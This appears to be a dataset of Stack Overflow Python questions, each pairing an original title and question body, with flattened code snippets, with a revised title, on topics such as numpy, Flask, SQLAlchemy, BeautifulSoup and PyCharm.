How to check python version that vim was compiled with?," In the terminal, it works to do but doing in vim throws a SyntaxError. <code>  python -c ""import sys; print(sys.version)"" :python -c ""import sys; print(sys.version)""",How to check python version called from vim?
How to test if an entire numpy array is masked," How do I test if every element in a numpy array is masked? Here's what I'd like to do: In practice I see this: Testing for masked is not helpful: <code>  x = #is a maksed numpy arraymasked_min = numpy.ma.min(x)if masked_min IS NOT A MASKED ELEMENT: #do some stuff only if masked_min is a value >>> x = numpy.ma.array(numpy.array([1,2,3]),mask=[True,True,True])>>> masked_min = numpy.ma.min(x)masked >>> numpy.ma.sum(x) == numpy.ma.maskedmasked",How to test if every element in a numpy array is masked
Why is JSON.dumps formatting my JSON weirdly?," I'm trying to return a function like this: Because of Pyramid's own JSON encoding, it's coming out double-encoded like this: How can I fix this? I need to use the default argument (or equivalent) because it's required for Mongo's custom types. <code>  @view_config(route_name='CreateNewAccount', request_method='GET', renderer='json')def returnJSON(color, message=None): return json.dumps({ ""color"" : ""color"", ""message"" : ""message"" }, default=json_util.default) ""{\""color\"": \""color\"", \""message\"": \""message\""}""",How can I configure Pyramid's JSON encoding?
What does the c underscore function `c_` do exactly?," It seems to be some kind of horizontal concatenation, but I could not find any documentation online. Here a minimal working example:  <code>  In [1]: from numpy import c_In [2]: a = ones(4)In [3]: b = zeros((4,10)) In [4]: c_[a,b]Out[4]: array([[ 1., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0.], [ 1., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0.], [ 1., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0.], [ 1., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0.]])",What does the c underscore expression `c_` do exactly?
How can I get PyCharm to find the right paths if I open a directory that is not the Django root, Our projects are usually structured: If I open /project-name instead of /django-project-name PyCharm underlines my imports saying they can't find and it tries to reference imports as src.django-project-name.app_name.models.Thing which can't actually be found when you run Django.How can I get it to work the same as when I mount /djang-project-name where it gets these things right? <code>  /project-name /src /django-project-name etc..readme.mdrequirements.txt,PyCharm can't find the right paths if I open a directory that is not the Django root
Python: count lower case characters in a string, What is the most pythonic and/or efficient way to count the number of characters in a string that are lowercase?Here's the first thing that came to mind: <code>  def n_lower_chars(string): return sum([int(c.islower()) for c in string]),Count lower case characters in a string
"""exits"" keyword in Python"," I've recently made the following example for Pythons for ... else: A fellow student told me, that this task can be done with Scala like this: Which gets lazy evaluated.Does something similar like the exists-keyword exist in Python? Or is there a PEP for that? <code>  def isPrime(element): """""" just a helper function! don't get religious about it! """""" if element == 2: return True elif element <= 1 or element % 2 == 0: return False else: for i in xrange(3, element, 2): print i if element % i == 0: return False return TruemyList = [4, 4, 9, 12]for element in myList: if isPrime(element): breakelse: print(""The list did not contain a prime."") List(4, 4, 9, 12) exists isPrime","""exists"" keyword in Python?"
How to read file attributes in directory?," For example: will list files in a directory.How do I get the file modification time for all files in the directory? <code>  import osprint(os.listdir(""path/to/dir""))",How to read file attributes in a directory?
python flask app validate text field - allow no space," I have an application in Python Flask, where a username field has a validation on length. I would also like to prevent spaces within the username. How could I achieve that? <code>  class RegistrationForm(Form): username = TextField('Username', [validators.Length(min=4, max=25)]) email = TextField('Email Address', [validators.Email(message='Invalid email address.')])",Python flask app validate text field - allow no space
python split string based on regular expression," I have the output of a command in tabular form. I'm parsing this output from a result file and storing it in a string. Each element in one row is separated by one or more whitespace characters, thus I'm using regular expressions to match 1 or more spaces and split it. However, a space is being inserted between every element: Is there a better way to do this? After each split str2 is appended to a list. <code>  >>> str1=""a b c d"" # spaces are irregular>>> str1'a b c d'>>> str2=re.split(""( )+"", str1)>>> str2['a', ' ', 'b', ' ', 'c', ' ', 'd'] # 1 space element between!!!",Split string based on a regular expression
ipython notebook line number, Error reports from most language kernels running in IPython/Jupyter Notebooks indicate the line on which the error occurred; but (at least by default) no line numbers are indicated in Notebooks.Is it possibile to add the line numbers to IPython/Jupyter Notebooks? <code> ,Showing line numbers in IPython/Jupyter Notebooks
What are the URL parameters? (element at #3 position in urlparse result)," I've taken a look to urlparse.urlparse method documentation and I'm a little bit confused about what is the parameters part (not to be confused with the more familiar query part, that is what goes after the question mark and before the fragment part).Wikipedia entry on URL's structure doesn't say anything about that, so could please anybody elaborate a little bit on this and possibly give some examples? <code> ",What are the URL parameters? (element at position #3 in urlparse result)
sqlalchemy update another model before deletion," I'm using sqlalchemy with postgresql. And I'm newbie of sqlalchemy.I made forien key for model ""User"" called ""to_user_id"" to model ""Invitation"" and this key is not nullable.When I try to delete instance of model ""User"" using And sqlalchemy set invitation's to_user_id to NULL automatically before deletion and postgresql raise following error. How can I disable it?Here's my model's definition <code>  session.delete(user) IntegrityError: (IntegrityError) null value in column ""to_user_id"" violates not-null constraint class User(Base): ''' User model ''' __tablename__='User' id = Column(Integer,primary_key=True)class Invitation(Base): ''' Invitation model ''' __tablename__ = 'Invitation' __table_args__ = (UniqueConstraint('appointment_id', 'to_user_id'),) id = Column(Integer, primary_key=True) appointment_id = Column(Integer,ForeignKey('Appointment.id', ondelete='CASCADE'), nullable=False) appointment = relationship('Appointment', backref=backref('invitations'), ) from_user_id = Column(Integer,ForeignKey('User.id', ondelete='SET NULL'), nullable=True) from_user = relationship('User', backref=backref('sent_invitations'), primaryjoin='Invitation.from_user_id==User.id') to_user_id = Column(Integer,ForeignKey('User.id', ondelete='CASCADE'), nullable=False) to_user = relationship('User',backref=backref('received_invitations'), primaryjoin='Invitation.to_user_id==User.id', )",sqlalchemy updates another model before deletion
Python - List of unique dictionaries," Let's say I have a list of dictionaries: How can I obtain a list of unique dictionaries (removing the duplicates)? <code>  [ {'id': 1, 'name': 'john', 'age': 34}, {'id': 1, 'name': 'john', 'age': 34}, {'id': 2, 'name': 'hanna', 'age': 30},] [ {'id': 1, 'name': 'john', 'age': 34}, {'id': 2, 'name': 'hanna', 'age': 30},]",List of unique dictionaries
Adding row/column headers to Numpy Matrices," I have a NumPy ndarray to which I would like to add row/column headers. The data is actually 7x12x12, but I can represent it like this: where A is my 2x6x6 array.How do I insert headers across the first row and the first column, so that each array looks like this in my CSV output file? Right now, what I have done is made the array 7x13x13 and inserted the data such that I have a row and column of zeros, but I'd much prefer strings. I guess I could just write an Excel macro to replace the zeros with strings. However, the problem is that NumPy cannot convert string to float, if I try to reassign those zeros as the strings I want. <code>  A=[[[0, 1, 2, 3, 4, 5], [1, 0, 3, 4, 5, 6], [2, 3, 0, 5, 6, 7], [3, 4, 5, 0, 7, 8], [4, 5, 6, 7, 0, 9], [5, 6, 7, 8, 9, 0]] [[0, 1, 2, 3, 4, 5], [1, 0, 3, 4, 5, 6], [2, 3, 0, 5, 6, 7], [3, 4, 5, 0, 7, 8], [4, 5, 6, 7, 0, 9], [5, 6, 7, 8, 9, 0]]] A, a, b, c, d, e, f a, 0, 1, 2, 3, 4, 5, b, 1, 0, 3, 4, 5, 6, c, 2, 3, 0, 5, 6, 7, d, 3, 4, 5, 0, 7, 8, e, 4, 5, 6, 7, 0, 9, f, 5, 6, 7, 8, 9, 0",Adding row/column headers to NumPy arrays
Check if a file is not open( not used by other process) in Python," I my application, i have below requests:1. There has one thread will regularly record some logs in file. The log file will be rollovered in certain interval. for keeping the log files small.2. There has another thread also will regularly to process these log files. ex: Move the log files to other place, parse the log's content to generate some log reports.But, there has a condition is the second thread can not process the log file that's using to record the log. in code side, the pseudocode similars like below: So, how do i check is a file is already open or is used by other process?I did some research in internet. And have some results: I tried this code, but it doesn't work, no matter i use ""r+"" or ""a+"" flag This code can work, but it can not reach my request, since i don't want to delete the file to check if it is open. <code>  #code in second thread to process the log filesfor logFile in os.listdir(logFolder): if not file_is_open(logFile) or file_is_use(logFile): ProcessLogFile(logFile) # move log file to other place, and generate log report.... try: myfile = open(filename, ""r+"") # or ""a+"", whatever you needexcept IOError: print ""Could not open file! Please close Excel!"" try: os.remove(filename) # try to remove it directlyexcept OSError as e: if e.errno == errno.ENOENT: # file doesn't exist break",Check if a file is not open nor being used by another process
Why can't I use the scipy.io?," I've been trying to get started with scipy, but the package is giving me some problems. The tutorial leans heavily on scipy.io, but when I import scypi and try to use scipy.io, I get errors: I've run system updates and I uninstalled scipy then installed it again.Interestingly enough, I can import the module this way: But then when I try to use it, I get an error as soon as I use a method: I'm sure I'm missing something embarrassingly basic, but I've not been able to find an answer to this problem on Google or in the stackoverflow archives. <code>  In [1]: import scipyIn [2]: help(scipy.io)---------------------------------------------------------------------------AttributeError Traceback (most recent call last)/home/chris/dev/scipy/<ipython-input-2-ef060398b31c> in <module>()----> 1 help(scipy.io)AttributeError: 'module' object has no attribute 'io' In [1]: import scipy.io In [2]: arr = scipy.array([[1.0,2.0],[3.0,4.0],[5.0,6.0]])In [3]: outFile = file('tmpdata1.txt', 'w')In [4]: scipy.io.write_array(outFile, arr)---------------------------------------------------------------------------AttributeError Traceback (most recent call last)/home/chris/dev/scipy/<ipython-input-4-46d22e4ff485> in <module>()----> 1 scipy.io.write_array(outFile, arr)AttributeError: 'module' object has no attribute 'write_array'",import problems with scipy.io
Python: BeautifulSoup - get an attribute value based on the name attribute," I want to print an attribute value based on its name, take for example I want to do something like this The above code give a KeyError: 'name', I believe this is because name is used by BeatifulSoup so it can't be used as a keyword argument. <code>  <META NAME=""City"" content=""Austin""> soup = BeautifulSoup(f) # f is some HTML containing the above meta tagfor meta_tag in soup(""meta""): if meta_tag[""name""] == ""City"": print(meta_tag[""content""])",Get an attribute value based on the name attribute with BeautifulSoup
whether the 2d keys exist or not python, Is there a single line method to check whether a Python 2d dict has an inner key/value?Right now i do somethng like this: Is there a better way to do this?Thanks <code>  if d.has_key(k1): if d[k1].has_key(k2): # do something,Single line of code to check for a key in a 2D nested inner dictionary
Where to store configuration files of python application," I have a python program that must work on Windows and Linux. There are some configuration options I normally store in a file, in a subdirectory of the program's directory.For Windows, I converted it to exe and created an Installer for it. And now I have the problem of dealing with the config file.What is the best place to save the configuration file? I have read that for Windows os.environ['APPDATA']+'myAppName' is the path that must be used. Is it correct? Is it standard? Will it work in all versions of Windows at least from XP (and at least in English and Spanish)?PD: I am not interested in using ConfigParser. Config file is in my own format and I have working code for reading/writing from it. <code> ",Where to store the configuration files of python applications on Windows
Where to store configuration files of python application on Windows," I have a python program that must work on Windows and Linux. There are some configuration options I normally store in a file, in a subdirectory of the program's directory.For Windows, I converted it to exe and created an Installer for it. And now I have the problem of dealing with the config file.What is the best place to save the configuration file? I have read that for Windows os.environ['APPDATA']+'myAppName' is the path that must be used. Is it correct? Is it standard? Will it work in all versions of Windows at least from XP (and at least in English and Spanish)?PD: I am not interested in using ConfigParser. Config file is in my own format and I have working code for reading/writing from it. <code> ",Where to store the configuration files of python applications on Windows
"PyCrypto in Jinja2 custom filter ""ImportError: cannot import name blockalgo"""," I have a function which encrypts a string with AES using PyCrypto. When I call that function in my unit tests, everything works fine. On the production environment, it works fine as well. However, when the function is called on the GAE development server, an error is thrown: ""ImportError: cannot import name blockalgo"". I tested it on Windows 7 (64 bit) and Mac OS 10.5. Both resulted in the same error. I'm using Google App Engine with Python 2.7. What could be the problem?app.yaml Encryption function: <code>  application: xxxversion: 6runtime: python27api_version: 1threadsafe: truelibraries:- name: django version: ""1.2""- name: webapp2 version: ""2.3""- name: jinja2 version: ""2.6""- name: pycrypto version: ""2.3""- name: PIL version: ""1.1.7""builtins:- appstats: on- remote_api: oninbound_services:- mail- warmup def encrypt(plaintext): from Crypto.Cipher import AES import hashlib password = 'xxx' key = hashlib.sha256(password).digest() mode = AES.MODE_ECB encryptor = AES.new(key, mode) BLOCK_SIZE = 16 PADDING = '{' pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING EncodeAES = lambda c, s: b58encode(c.encrypt(pad(s))) encrypted = EncodeAES(encryptor, plaintext) if len(encrypted) < 22: for i in range (len(encrypted), 22): encrypted += ""_"" return encrypted","PyCrypto in Google App Engine development server ""ImportError: cannot import name blockalgo"""
"PyCrypto in Google App Engine ""ImportError: cannot import name blockalgo"""," I have a function which encrypts a string with AES using PyCrypto. When I call that function in my unit tests, everything works fine. On the production environment, it works fine as well. However, when the function is called on the GAE development server, an error is thrown: ""ImportError: cannot import name blockalgo"". I tested it on Windows 7 (64 bit) and Mac OS 10.5. Both resulted in the same error. I'm using Google App Engine with Python 2.7. What could be the problem?app.yaml Encryption function: <code>  application: xxxversion: 6runtime: python27api_version: 1threadsafe: truelibraries:- name: django version: ""1.2""- name: webapp2 version: ""2.3""- name: jinja2 version: ""2.6""- name: pycrypto version: ""2.3""- name: PIL version: ""1.1.7""builtins:- appstats: on- remote_api: oninbound_services:- mail- warmup def encrypt(plaintext): from Crypto.Cipher import AES import hashlib password = 'xxx' key = hashlib.sha256(password).digest() mode = AES.MODE_ECB encryptor = AES.new(key, mode) BLOCK_SIZE = 16 PADDING = '{' pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING EncodeAES = lambda c, s: b58encode(c.encrypt(pad(s))) encrypted = EncodeAES(encryptor, plaintext) if len(encrypted) < 22: for i in range (len(encrypted), 22): encrypted += ""_"" return encrypted","PyCrypto in Google App Engine development server ""ImportError: cannot import name blockalgo"""
what is the pythonic way to find common elements of multiple lists without reordering (e.g. due to using sets)," Given: a list of lists, such as [[3,2,1], [3,2,1,4,5], [3,2,1,8,9], [3,2,1,5,7,8,9]]Todo: Find the longest common prefix of all sublists.Exists: In another thread ""Common elements between two lists not using sets in Python"", it is suggested to use ""Counter"", which is available above python 2.7. However our current project was written in python 2.6, so ""Counter"" is not used.I currently code it like this: But I find it not very pythonic, is there a better way of coding?Thanks!New edit: Sorry to mention: in my case, the shared elements of the lists in 'l' have the same order and alway start from the 0th item. So you wont have cases like [[1,2,5,6],[2,1,7]] <code>  l = [[3,2,1], [3,2,1,4,5], [3,2,1,8,9], [3,2,1,5,7,8,9]]newl = l[0]if len(l)>1: for li in l[1:]: newl = [x for x in newl if x in li]",What is the Pythonic way to find the longest common prefix of a list of lists?
Unicode with Python: UnicodeEncodeError: 'ascii' codec can't encode character [...]," I have read the HOWTO on Unicode from the official docs and a full, very detailed article as well. Still I don't get it why it throws me this error.Here is what I attempt: I open an XML file that contains chars out of ASCII range (but inside allowed XML range). I do that with cfg = codecs.open(filename, encoding='utf-8, mode='r') which runs fine. Looking at the string with repr() also shows me a unicode string.Now I go ahead and read that with parseString(cfg.read().encode('utf-8'). Of course, my XML file starts with this: <?xml version=""1.0"" encoding=""utf-8""?>. Although I suppose it is not relevant, I also defined utf-8 for my python script, but since I am not writing unicode characters directly in it, this should not apply here. Same for the following line: from __future__ import unicode_literals which also is right at the beginning.Next thing I pass the generated Object to my own class where I read tags into variables like this: xmldata.getElementsByTagName(tagName)[0].firstChild.data and assign it to a variable in my class.Now what perfectly works are those commands (obj is an instance of the class): And this command does work as well: I defined __iter__() to just yield every variable while __repr__() uses the typical printf stuff: ""%s"" % self.varnameBoth commands print perfectly and can output the unicode character.What does not work is this: And now I am stuck because this throws the dreaded So what am I missing? What am I doing wrong? I am looking for a general solution, I always want to handle strings as unicode, just to avoid any possible errors and write a compatible program.Edit: I also defined this: From documentation I got that this  <code>  for element in obj: print element print obj.__repr__() print obj UnicodeEncodeError: 'ascii' codec can't encode character u'\xfc' in position 47: def __str__(self): return self.__repr__()def __unicode__(self): return self.__repr__()",UnicodeEncodeError: 'ascii' codec can't encode character [...]
Python Sort Last Characters," In newer Python, I am able to use the sorted function and easily sort out a list of strings according to their last few chars as such: How can I implement the above to lots_list.sort() in older Python (2.3)?"" Error: When I tried using sorted(), the global name sorted is not defined. ""  <code>  lots_list = ['anything']print sorted(lots_list, key=returnlastchar)def returnlastchar(s): return s[10:] ",Sort a list of strings by last N characters in Python 2.3
Python : * and ** before variable," Possible Duplicate: Understanding kwargs in Python I have read a piece of python code, and I don't know what does * and ** mean in this code : I just know about one use of *: extract all attribute it has to parameter of method or constructor.If this true for above function, so what does the rest : ** ? <code>  def functionA(self, *a, **kw): // code here",What do * and ** before a variable name mean in a function signature?
What does * and ** before a variable name means in a function signature?," Possible Duplicate: Understanding kwargs in Python I have read a piece of python code, and I don't know what does * and ** mean in this code : I just know about one use of *: extract all attribute it has to parameter of method or constructor.If this true for above function, so what does the rest : ** ? <code>  def functionA(self, *a, **kw): // code here",What do * and ** before a variable name mean in a function signature?
Python strongly typed?," I've come across links that say Python is a strongly typed language.However, I thought in strongly typed languages you couldn't do this: I thought a strongly typed language didn't accept type-changing at run-time. Maybe I've got a wrong (or too simplistic) definition of strong/weak types.So, is Python a strongly or weakly typed language? <code>  bob = 1bob = ""bob""",Is Python strongly typed?
Get hours difference from UTC to given timezone with Python, Is there a way to get how many hours a differene there is between UTC and a given timezone?For instance the difference between UTC and Europe/Amsterdam is +2 hours.Is there something in python for this? <code> ,How to get hours difference from UTC to given timezone?
Timstamp fields in django," I have a MySQL database, right now I'm generating all of the datetime fields as models.DateTimeField. Is there a way to get a timestamp instead? I want to be able to autoupdate on create and update etc.The documentation on django doesn't have this? <code> ",Timestamp fields in django
Regular expression: FSM," Since \w\w means two characters, 'he' and 'll' are expected. But why do 'el' and 'lo' not match the regex? <code>  >>> match = re.findall(r'\w\w', 'hello')>>> print match['he', 'll'] >>> match1 = re.findall(r'el', 'hello')>>> print match1['el']>>>",How to find overlapping matches with a regexp?
haw to tell if a semaphore is full in python, I have a bounded semaphore object that ensures my program doesn't download more than a certain number of files at a time. Each worker thread acquires the semaphore when it starts downloading and releases it when done. I have another thread that would like to run code when nothing is being downloaded. I would like a method for locking until the semaphore is completely available. How can I do this in Python? <code> ,how to tell if a semaphore is full in python
can we use xpath with BeautifulSoup?," I am using BeautifulSoup to scrape an URL and I had the following code, to find the td tag whose class is 'empformbody': Now in the above code we can use findAll to get tags and information related to them, but I want to use XPath. Is it possible to use XPath with BeautifulSoup? If possible, please provide me example code. <code>  import urllibimport urllib2from BeautifulSoup import BeautifulSoupurl = ""http://www.example.com/servlet/av/ResultTemplate=AVResult.html""req = urllib2.Request(url)response = urllib2.urlopen(req)the_page = response.read()soup = BeautifulSoup(the_page)soup.findAll('td',attrs={'class':'empformbody'})",can we use XPath with BeautifulSoup?
Python-Numpy: Reading and storing arbitrary-byte-length integers from a file," I am attempting to speed up a binary file parser I wrote last year by doing the parsing/data accumulation in numpy. numpy's ability to define customized data structures and slurp data from a binary file into them looks like what I need, except some of the fields in these files are unsigned integers of ""nonstandard"" length (e.g. 6 bytes). Since I am using Python 2.7, I made my own emulated version of int.from_bytes to handle these fields, but if there is any way to read these fields to integers natively in numpy, that would obviously be much faster and preferable. <code> ",Reading and storing arbitrary byte length integers from a file
How do I initialize a dictionary of empty lists in python?," My attempt to programmatically create a dictionary of lists is failing to allow me to individually address dictionary keys. Whenever I create the dictionary of lists and try to append to one key, all of them are updated. Here's a very simple test case: Actual result: {0: ['hello'], 1: ['hello']}Expected result: {0: [], 1: ['hello']}Here's what works Actual and Expected Result: {0: [], 1: ['hello']}Why is the fromkeys method not working as expected? <code>  data = {}data = data.fromkeys(range(2),[])data[1].append('hello')print data data = {0:[],1:[]}data[1].append('hello')print data",How do I initialize a dictionary of empty lists in Python?
Typical Angular.js workflow and project structure (with Python Flask)," I am pretty new to this whole MV* client-side framework frenzy. It doesn't have to be AngularJS, but I picked it because it feels more natural to me than either Knockout, Ember or Backbone. Anyway what is the workflow like? Do people start with developing a client-side application in AngularJS and then hooking up the back-end to it?Or the other way around by first building the back-end in Django, Flask, Rails and then attaching an AngularJS app to it? Is there a ""right"" way of doing it, or is it just a personal preference in the end?I am also not sure whether to structure my project according to the Flask or AngularJS? community practices.For example, Flask's minitwit app is structured like so: AngularJS tutorial app is structured like this: I could picture a Flask app by itself, and it's fairly easy to see AngularJS app like ToDo List by itself but when it comes to using both of these technologies I don't understand how they work together. It almost seems like I don't need a server-side web-framework when you already have AngularJS, a simple Python web server will suffice. In the AngularJS to-do app for example they use MongoLab to talk to the database using Restful API. There was no need having a web framework on the back-end.Maybe I am just awfully confused, and AngularJS is nothing more than a fancy jQuery library so I should use just like I would use jQuery in my Flask projects (assuming I change the AngularJS template syntax to something that doesn't conflict with Jinja2). I hope my questions make some sense. I mainly work on the back-end and this client-side framework is an unknown territory for me. <code>  minitwit|-- minitwit.py|-- static |-- css, js, images, etc...`-- templates |-- html files and base layout angular-phonecat|-- app `-- css `-- img `-- js `-- lib `-- partials `-- index.html|-- scripts `-- node.js server and test server files",Typical AngularJS workflow and project structure (with Python Flask)
python - start a function at given time," How can I run a function in Python, at a given time?For example: and it will run the function func at 2012-07-17 15:50:00.I tried the sched.scheduler, but it didn't start my function. What can I do? <code>  run_it_at(func, '2012-07-17 15:50:00') import time as time_modulescheduler = sched.scheduler(time_module.time, time_module.sleep)t = time_module.strptime('2012-07-17 15:50:00', '%Y-%m-%d %H:%M:%S')t = time_module.mktime(t)scheduler_e = scheduler.enterabs(t, 1, self.update, ())",Start a Function at Given Time
Python - Start a Function at Given Time," How can I run a function in Python, at a given time?For example: and it will run the function func at 2012-07-17 15:50:00.I tried the sched.scheduler, but it didn't start my function. What can I do? <code>  run_it_at(func, '2012-07-17 15:50:00') import time as time_modulescheduler = sched.scheduler(time_module.time, time_module.sleep)t = time_module.strptime('2012-07-17 15:50:00', '%Y-%m-%d %H:%M:%S')t = time_module.mktime(t)scheduler_e = scheduler.enterabs(t, 1, self.update, ())",Start a Function at Given Time
How to check is a list exsists in Python," What is the easiest way to check to see if a list or dict exists in python ?Im using the following but this isn't working: Thanks, <code>  if len(list) == 0: print ""Im not here""",How to check if a list exists in Python
Add command line arguments with flags in Python3," I have to input the parameters from the command line i.e username, password, and database name. I know how to do that without using flags, by using sys.argv like below: So, it could be run as: But the problem is that I have to use 'flags'. So, the script could be run like this: How can I use flags to take arguments from the command line? <code>  ##Test.pyhostname = str(sys.argv[1])username = str(sys.argv[2])password = str(sys.argv[3])def ConnecttoDB(): try: con=sql.connect(host=hostname, user= username, passwd= password) print ('\nConnected to Database\n')# If we cannot connect to the database, send an error to the user and exit the program. except sql.Error: print (""Error %d: %s"" % (sql.Error.args[0],sql.Error.args[1])) sys.exit(1) return con $test.py DATABASE USERNAME PASWORD $test.py -db DATABSE -u USERNAME -p PASSWORD -size 20",How to add command line arguments with flags in Python3?
"How to plot a very simple histogram (Python, Matplotlib) using input *.txt file?"," I use Python 2.7 and matplotlib. I have a *.txt data file : first column of my file (numbers) should be on axis Y in my bar chart, and the second column from my file (dates) should be on axis OX in my histogram. I only know how to read the file: I did read a matplotlib docs but it still doesn't help me. I would also like to add dates I read to my bar chart, to make it look likeCould someone please help me? <code>  0 14-11-20031 15-03-199912 04-12-201233 09-05-200744 16-08-199855 25-07-200176 31-12-201187 25-06-1993118 16-02-1995119 10-02-1981145 03-05-2014 OX = []OY = []try : with open('data.txt', 'r') as openedFile : for line in openedFile : tab = line.split() OY.append(int(tab[0])) OX.append(str(tab[1]))except IOError : print(""IOError!"")","How to plot a very simple bar chart (Python, Matplotlib) using input *.txt file?"
matplotlib: using a colormap to color cell-background," I have a Pandas dataframe, and i want to plot it as matplotlib table. So far i have that part working with following code: At the end of this i would like to set the background-color of the cell according to the colormap - but how do i look it up in the clm array without an index?Another question: can i somehow pass a format string to the table, so that it formats the text to 2 decimal places?Any hints appreciated,Andy <code>  import numpy as nprandn = np.random.randnfrom pandas import *idx = Index(arange(1,11))df = DataFrame(randn(10, 5), index=idx, columns=['A', 'B', 'C', 'D', 'E'])vals = np.around(df.values,2)fig = plt.figure(figsize=(15,8))ax = fig.add_subplot(111, frameon=True, xticks=[], yticks=[])the_table=plt.table(cellText=vals, rowLabels=df.index, colLabels=df.columns, colWidths = [0.03]*vals.shape[1], loc='center')table_props = the_table.properties()table_cells = table_props['child_artists']clm = cm.hot(vals)for cell in table_cells: cell.set_height(0.04) # now i would like to set the backgroundcolor of the cell",matplotlib: using a colormap to color table-cell background
Python - Overwriting Folder If It Already Exists," The following code allows me to create a directory if it does not already exist. The folder will be used by a program to write text files into that folder. But I want to start with a brand new, empty folder next time my program opens up. Is there a way to overwrite the folder (and create a new one, with the same name) if it already exists? <code>  dir = 'path_to_my_folder'if not os.path.exists(dir): os.makedirs(dir)",How to overwrite a folder if it already exists when creating it with makedirs?
IOError: [Errno 22] Invalid argument when writing large bytestring," I'm getting when I try to write a large bytestring to disk with f.write(), where f was opened with mode wb.I've seen lots of people online getting this error when using a Windows network drive, but I'm on OSX (10.7 when I originally asked the question but 10.8 now, with a standard HFS+ local filesystem). I'm using Python 3.2.2 (happens on both a python.org binary and a homebrew install). I don't see this problem with the system Python 2.7.2.I also tried mode w+b based on this Windows bug workaround, but of course that didn't help.The data is coming from a large numpy array (almost 4GB of floats). It works fine if I manually loop over the string and write it out in chunks. But because I can't write it all in one pass, np.save and np.savez fail -- since they just use f.write(ary.tostring()). I get a similar error when I try to save it into an existing HDF5 file with h5py.Note that I get the same problem when reading a file opened with file(filename, 'rb'): f.read() gives this IOError, while f.read(chunk_size) for reasonable chunk_size works.Any thoughts? <code>  IOError: [Errno 22] Invalid argument",IOError: [Errno 22] Invalid argument when reading/writing large bytestring
Read data from csv-file and transform to correct data-type," When I read data back in from a CSV file, every cell is interpreted as a string.How can I automatically convert the data I read in into the correct type?Or better: How can I tell the csv reader the correct data-type of each column?(I wrote a 2-dimensional list, where each column is of a different type (bool, str, int, list of integer), out to a CSV file.)Sample data (in CSV file): <code>  IsActive,Type,Price,StatesTrue,Cellphone,34,""[1, 2]"",FlatTv,3.5,[2]False,Screen,100.23,""[5, 1]""True,Notebook, 50,[1]","Read data from CSV file and transform from string to correct data-type, including a list-of-integer column"
SQLAlchemy: get Model from table name," I want to make a function that, given the name of a table, returns the model with that tablename.Eg: so getModelFromTableName('table') should return the Model class.My aim is to use the function in a simple form generator I'm making since FormAlchemy does not work with python3.2 and I want it to handle foreign keys nicely. Can anyone give me any pointers on how to get getModelFromTableName to work?Here's one idea I have (it might be totally wrong, I haven't worked with meta classes before...)What if I were to make my Model classes inherit from Base as well as some other class (TableReg) and have the class meta of TableReg store Model.tablename in some global dictionary or Singleton. I realise this could be totally off because Base's metaclass does some very important and totally nifty stuff that I don't want to break, but I assume there has to be a way for me to append a little bit of constructor code to the meta class of my models. Or I don't understand.  <code>  class Model(Base): __tablename__ = 'table' ...a bunch of Columnsdef getModelFromTableName(tablename): ...something magical",SQLAlchemy: get Model from table name. This may imply appending some function to a metaclass constructor as far as I can see
Python: hex conversion always two digits," Does anyone know how to get a chr to hex conversion where the output is always two digits? for example, if my conversion yields 0x1, I need to convert that to 0x01, since I am concatenating a long hex string.The code that I am using is: <code>  hexStr += hex(ord(byteStr[i]))[2:]",How can I format an integer to a two digit hex?
Python - get full package module name," For verbose debug messages in my application I'm using a function that returns a helpful prefix. Consider the following example: This outputs: My issue is: When I have a module in a package, for instance 'myproject.utilities.input', the module name returned from get_verbose_prefix is still just 'input', not 'myproject.utilities.input'. This drastically reduces the helpfulness of the prefix in large projects when there can be several 'input' modules in different submodules all working together.So my question is: Is there a simple way of retrieving the full module name within it's package in Python? I'm planning on expanding the get_verbose_prefix function to check for '__init__.py' files in the parent directories of the module to extrapolate it's full name, but first I'd like to know if there's an easier way to do it. <code>  import inspectdef get_verbose_prefix(): """"""Returns an informative prefix for verbose debug output messages"""""" s = inspect.stack() module_name = inspect.getmodulename(s[1][1]) func_name = s[1][3] return '%s->%s' % (module_name, func_name)def awesome_function_name(): print ""%s: Doing some awesome stuff right here"" % get_verbose_prefix()if __name__ == '__main__': awesome_function_name() test->awesome_function_name: Doing some awesome stuff right here",Get full package module name
Python: BeautifulSoup extract text from anchor tag," I want to extract:text from following src of the image tag andtext of the anchor tag which is inside the div class dataI successfully manage to extract the img src, but am having trouble extracting the text from the anchor tag. Here is the link for the entire HTML page.Here is my code: What I am trying to do is extract the image src (link) and the title inside the div class=data, so for example: should extract: Nikon COOLPIX L26 16.1 MP Digital Camera with 5x Zoom NIKKOR Glass Lens and 3-inch LCD (Red) <code>  <a class=""title"" href=""http://www.amazon.com/Nikon-COOLPIX-Digital-Camera-NIKKOR/dp/B0073HSK0K/ref=sr_1_1?s=electronics&amp;ie=UTF8&amp;qid=1343628292&amp;sr=1-1&amp;keywords=digital+camera"">Nikon COOLPIX L26 16.1 MP Digital Camera with 5x Zoom NIKKOR Glass Lens and 3-inch LCD (Red)</a> for div in soup.findAll('div', attrs={'class':'image'}): print ""\n"" for data in div.findNextSibling('div', attrs={'class':'data'}): for a in data.findAll('a', attrs={'class':'title'}): print a.text for img in div.findAll('img'): print img['src'] <a class=""title"" href=""http://www.amazon.com/Nikon-COOLPIX-Digital-Camera-NIKKOR/dp/B0073HSK0K/ref=sr_1_1?s=electronics&amp;ie=UTF8&amp;qid=1343628292&amp;sr=1-1&amp;keywords=digital+camera"">Nikon COOLPIX L26 16.1 MP Digital Camera with 5x Zoom NIKKOR Glass Lens and 3-inch LCD (Red)</a> ",BeautifulSoup: extract text from anchor tag
PyCharm - Unresolved References with Remote Interpreter," I am using PyCharm to work on a project. The project is opened and configured with an interpreter, and can run successfully. The remote interpreter paths are mapped properly. This seems to be the correct configuration, but PyCharm is highlighting my valid code with ""unresolved reference"" errors, even for built-in Python functions. Why don't these seem to be detected, even though the code runs? Is there any way to get PyCharm to recognize these correctly?This specific instance of the problem is with a remote interpreter, but the problem appears on local interpreters as well. <code> ",PyCharm shows unresolved references error for valid code
sorting python dict based on values on the value-dictionary," How do you sort a Python dictionary based on the inner value of a nested dictionary?For example, sort mydict below based on the value of context: The result should be like this: <code>  mydict = { 'age': {'context': 2}, 'address': {'context': 4}, 'name': {'context': 1}} { 'name': {'context': 1}, 'age': {'context': 2}, 'address': {'context': 4} }",Sorting Python dictionary based on nested dictionary values
